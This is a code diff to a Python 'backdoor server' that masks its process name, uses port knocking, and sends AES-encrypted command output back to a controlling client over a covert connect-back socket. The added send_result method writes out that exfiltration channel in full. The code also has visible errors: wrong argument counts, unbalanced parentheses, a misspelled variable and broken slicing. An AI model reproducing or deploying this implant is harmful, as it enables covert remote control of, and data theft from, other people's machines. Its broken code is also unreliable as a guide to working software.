@@ -33,18 +33,20 @@ def make_iv():
 
 class BackdoorServer(object):
 
-    def __init__(self, procname, aeskey, password):
+    def __init__(self, procname, aeskey, password, clientport):
         """Initialises a backdoor server with the given settings.
         
         Positional arguments:
         procname - the name with which to replace the current process's name. cannot contain spaces.
         aeskey   - a "secret" pre-shared key to use for AES encryption. the client and server will already know this key.
         password - a password to authenticate clients and ensure that decryption succeeded.
+        clientport - The port on which the server will connect back to clients to send command results.
         """
         self.procname = procname
         self.aeskey = aeskey
         self.password = password
         self.client = None
+        self.dport = clientport
 
     def mask_process(self):
         """Changes the process's name to self.procname to make it less conspicuous to people examining the process table."""
@@ -61,10 +63,10 @@ class BackdoorServer(object):
         """Listens for a client and stores its IP address (as a string) in self.client on receiving a connection."""
         raise NotImplementedError
 
-    def port_knock(self, ip_addr, knocked_ports):
+    def port_knock(self, knocked_ports):
         """Knock on ports decided by user"""
         for port in knocked_ports:
-            send(IP(dst=ip_addr)/TCP(dport=port),verbose=0)
+            send(IP(dst=self.client)/TCP(dport=port),verbose=0)
         
 
     def recv_command(self, queue):
@@ -107,45 +109,101 @@ class BackdoorServer(object):
                 return cmd
 
 
-    def send_result(self, queue, result):
-        """Sends the results of a command execution to the client.
-        
-        Positional arguments:
-        result - A Result object containing the command's result.
-        """
-        # TODO: Change packet structure to handle splitting result into multiple packets (1KiB each)
-        # First packet structure:
-        # - 16 bytes: initialisation vector
-        # - 4 bytes: length of entire result (i.e. len(result.to_bytes()))
-        # - 8 bytes: password
-        # - remaining bytes: result bytes; if length of result is < 996, extra space is filled with random bytes
-        # 
-        # Subsequent packets (if the result didn't fit in the first one):
-        # - 8 bytes: password
-        # - remaining bytes: result bytes + random bytes if remaining result len is < 1016 bytes
-        #
-        # All subsequent packets will use the same IV as the first packet. The password is only included again
-        # so that the client can verify that everything was decrypted successfully.
-        #
-        # Also TODO: Remove send() and do connection setup/teardown in here
-        payload = self.password + result.to_bytes()
-        payload = struct.pack("<I", len(payload)) + payload
-
-        remainder = len(payload) % Crypto.Cipher.AES.block_size
-        if remainder:
-            payload += '\0' * (Crypto.Cipher.AES.block_size - remainder)
-
-        iv = make_iv()        
-        encryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
-        payload = encryptor.encrypt(payload)
-        payload = iv + payload
-
-        self.send(payload)
-    
     def result_queue(self, queue):
         while True:
             result = queue.pop()
             self.send_result(result)
+
+
+    def send_result(self, queue, result):
+        """Sends the results of a command execution to the client.
+
+        Positional arguments:
+        result - A Result object containing the command's result.
+        """
+
+        retry_count = 5
+        knock_wait_time = 0.5
+        sock_timeout = 1
+
+        covert_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        covert_sock.settimeout(sock_timeout)
+
+        for i in range(0, retry_count):
+            self.port_knock()
+            time.sleep(knock_wait_time)
+            result = covert_sock.connect_ex((self.client, self.dport))
+            if result == 0:
+                break
+
+        if result != 0:
+            print("Client connection retries exceeded. Failed to send result.")
+            return
+
+        # First packet structure:
+        # - 16 bytes: initialisation vector
+        # - 4 bytes: random padding bytes for crypto alignment
+        # - 4 bytes: length of entire result (i.e. len(result.to_bytes()))
+        # - 8 bytes: password
+        # - remaining bytes: result bytes; if length of result is < 996, extra space is filled with random bytes
+
+        first_packet_payload_max = PACKET_SIZE - 16 - 4 - 4 - 8
+        other_packet_payload_max = PACKET_SIZE - 8
+
+        iv = make_iv()
+        encryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
+
+        start_padding = random.random(2147483647, 4294967295)
+
+        result_bytes = result.to_bytes()
+        result_len = len(result_bytes)
+
+        payload = struct.pack("<I", start_padding)
+        payload += struct.pack("<I", result_len)
+        payload += self.password
+        payload += result_bytes[:min(len(result_bytes), first_packet_payload_max]
+        if result_len < first_packet_payload_max:
+            with open('/dev/random', 'r') as randfile:
+                remainder = first_packet_payload_max - result_len
+                payload += randfile.read(remainder)
+
+        payload = encryptor.encrypt(payload)
+        payload = iv + payload
+    
+        try:
+            covert_sock.sendall(payload)
+        except Exception, e:
+            print("Exception while transmitting result: {}".format(str(e))
+            covert_sock.shutdown(socket.SHUT_RDWR)
+            return
+
+        if result_len > first_packet_payload_max:
+            offset = first_packet_payload_max
+            result_len -= first_packet_payload_max
+            while result_len:
+                # Subsequent packets (if the result didn't fit in the first one):
+                # - 8 bytes: password
+                # - remaining bytes: result bytes + random bytes if remaining result len is < 1016 bytes
+                result_chunk_size = min(result_len, other_packet_payload_max)
+                payload = self.password
+                payload += result_bytes[offset:result_chunk_size]
+
+                if result_chunk_size < other_packet_payload_max:
+                    with open('/dev/random', 'r') as randfile:
+                        remainder = other_packet_payload_max - result_chunk_size
+                        payload += randfile.read(remainder)
+
+                try:
+                    covert_sock.sendall(payload)
+                except Exception, e:
+                    print("Exception while transmitting result: {}".format(str(e))
+                    covert_sock.shutdown(socket.SHUT_RDWR)
+                    return
+
+                result_len -= result_chunk_size
+                offset += result_chunk_size
+
+        covert_sock.shutdown(socket.SHUT_RDWR)
 
     def run(self):
         """Runs in a loop listening for clients and serving their requests."""
@@ -194,16 +252,14 @@ class BackdoorServer(object):
 
 class TcpBackdoorServer(BackdoorServer):
 
-    def __init__(self, procname, aeskey, password, listenport, clientport):
+    def __init__(self, procname, aeskey, password, clientport, listenport):
         """Creates a new TcpBackdoorServer with the specified settings.
         
         Positional arguments:
         listenport - The port on which the backdoor server will listen for clients.
-        clientport - The port on which the server will connect back to clients to send command results.
         """
-        super(TcpBackdoorServer, self).__init__(procname, aeskey, password)
+        super(TcpBackdoorServer, self).__init__(procname, aeskey, password, clientport)
         self.lport = listenport
-        self.dport = clientport
 
     def listen(self):
         # Create a new random source port from which to send
@@ -251,16 +307,14 @@ class TcpBackdoorServer(BackdoorServer):
             sys.exit(1)
 
 class UdpBackdoorServer(BackdoorServer):
-    def __init__(self, procname, aeskey, password, listenport, clientport):
+    def __init__(self, procname, aeskey, password, clientport, listenport):
         """Creates a new UdpBackdoorServer with the specified settings.
         
         Positional arguments:
         listenport - The port on which the backdoor server will listen for clients.
-        clientport - The port on which the server will connect back to clients to send command results.
         """
-        super(UdpBackdoorServer, self).__init__(procname, aeskey, password)
+        super(UdpBackdoorServer, self).__init__(procname, aeskey, password, clienport)
         self.lport = listenport
-        self.dport = clientport
 
     def listen(self):
         # Create a new random source port from which to send
